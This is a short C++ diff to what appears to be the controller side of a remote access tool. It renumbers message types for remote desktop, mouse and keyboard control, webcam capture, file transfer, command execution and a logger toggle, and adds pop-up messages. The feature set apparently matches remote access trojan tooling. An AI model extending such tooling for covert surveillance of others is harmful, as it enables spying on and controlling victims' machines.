@@ -46,15 +46,17 @@ void rcv(NetworkHandlerClient NH) {
     NH.AddDataType("DesktopIMG", 2);
     NH.AddDataType("MousePos", 3);
     NH.AddDataType("MouseDown", 4);
-    NH.AddDataType("MouseUp", 4);
-    NH.AddDataType("KeyDown", 5);
-    NH.AddDataType("KeyUp", 6);
-    NH.AddDataType("CamIMG", 7);
-    NH.AddDataType("SendFILE", 8);
-    NH.AddDataType("RecvFILE", 8);
-    NH.AddDataType("CMD", 9);
-    NH.AddDataType("EnableLogger", 10);
-    NH.AddDataType("DisableLogger", 11);
+    NH.AddDataType("MouseUp", 5);
+    NH.AddDataType("KeyDown", 6);
+    NH.AddDataType("KeyUp", 7);
+    NH.AddDataType("CamIMG", 8);
+    NH.AddDataType("SendFILE", 9);
+    NH.AddDataType("RecvFILE", 10);
+    NH.AddDataType("CMD", 11);
+    NH.AddDataType("EnableLogger", 12);
+    NH.AddDataType("DisableLogger", 13);
+    NH.AddDataType("RecvPopUp", 14);
+    NH.AddDataType("RecvPopUpYN", 15);
     //NH.AddDataType("", 3);
 
     NH.SendTypeList();
@@ -94,12 +96,6 @@ void rcv(NetworkHandlerClient NH) {
                 cv::destroyWindow(CamFeed);
             }
         }
-        else if (dt.Name == "PopUp") {
-            printf("invalid packet type");
-        }
-        else if (dt.Name == "PopUpYN") {
-            printf("invalid packet type");
-        }
         else if (dt.Name == "Invalid") {
             printf("invalid packet type");
         }
@@ -118,6 +114,9 @@ int main()
     string ip="None";
     string port= "None";
     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+
+    recvThread = thread();
+
     while (true)
     {
         SetConsoleTextAttribute(hConsole, 12);
